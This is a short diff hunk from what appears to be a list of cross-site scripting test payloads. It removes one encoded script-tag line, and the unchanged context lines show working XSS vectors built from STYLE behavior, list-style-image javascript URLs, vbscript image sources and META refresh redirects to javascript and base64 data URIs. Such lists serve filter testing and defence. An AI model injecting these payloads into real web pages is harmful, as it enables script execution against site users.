@@ -127,7 +127,6 @@ alert(a.source)</SCRIPT>
 <XSS STYLE="behavior: url(xss.htc);">
 <STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
 <IMG SRC='vbscript:msgbox("XSS")'>
-¼script¾alert(¢XSS¢)¼/script¾
 <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
 <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
 <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
